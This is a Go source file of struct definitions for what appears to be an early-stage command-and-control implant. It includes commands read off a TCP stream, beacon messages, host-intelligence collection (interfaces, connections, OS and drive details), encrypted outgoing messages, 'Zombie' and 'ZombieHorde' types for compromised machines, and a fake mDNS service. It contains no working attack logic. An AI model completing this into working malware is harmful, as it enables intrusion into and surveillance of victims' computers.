/*/
This file contain the structs for making basic types necessary in
"defining the reality" , that is to say, we are making "concepts"
each concept has its own faucets, traits, and actions

Resources:
	- https://gobyexample.com/structs

Go Tips:
	Field Names seem to require capitalization

/*/

package Core

import (
	"crypto/cipher"
	"encoding/json"
	"hash"
	"io"
	"net"

	"github.com/cakturk/go-netstat/netstat"
	"github.com/hashicorp/mdns"
	"github.com/shirou/gopsutil/disk"
)

// struct to represent an OS command from the wire
// we will be shoving a JSON payload into this
// directly from the tcp stream
type Command struct {
	Task_id int
	//store as raw message for now, want to do everything procedurally
	Json_input      json.RawMessage
	Command_string  string
	Info_message    string
	Success_message string
	Failure_message string
}

// container for Commands
type CommandSet struct {
	// temporarily declared as string during development so
	// the linter/compiler stop throwing errors
	CommandArray string
}

/*/
Contents of post beacon message are as follows:
	Encrypt{
		OutgoingMessage
			Json{HostIntel}
	}

Contents of message are as follows:
	Encrypt{
		OutgoingMessage
			Json{

			}

/*/

// Initial Reply to Beacon from Command Center
type BeaconResponse struct {
	Authstring string
}

// Container for Outgoing messages to the Command And Control
type OutgoingMessage struct {
	// we can declare traits as any type we want

	Contents json.RawMessage
}

// struct to hold intel about host
type HostIntel struct {
	Interfaces          []net.Interface
	Network_information json.RawMessage
	OSInfo              json.RawMessage
	UDPConnections      []netstat.SockTabEntry
	TCPConnections      []netstat.SockTabEntry
	DriveInformation    []disk.PartitionStat
}

// code from:
// https://github.com/bluesentinelsec/OffensiveGoLang/blob/master/pkg/windows/discovery/os.go
// OSinfo provides basic information about the target operating system
type OSInfo struct {
	ProductName      string
	ReleaseID        string
	CurrentBuild     string
	InstallationType string
	RegisteredOwner  string
	InstallDate      uint64
	InstallTime      uint64
	ProductID        string
}

/*
Code from :
	- https://medium.com/@mat285/encrypting-streams-in-go-6cff6062a107
*/
type StreamEncrypter struct {
	Source io.Reader
	Block  cipher.Block
	Stream cipher.Stream
	Mac    hash.Hash
	IV     []byte
}

// we need objects to represent a compromised computer
type Zombie struct {
}

// and a set of compromised computers
type ZombieHorde struct {
}

// a "thing" to represent a fallacious MDNS service
type FakeMDNSService struct {
	Host    string
	Info    string
	Service mdns.MDNSService
}
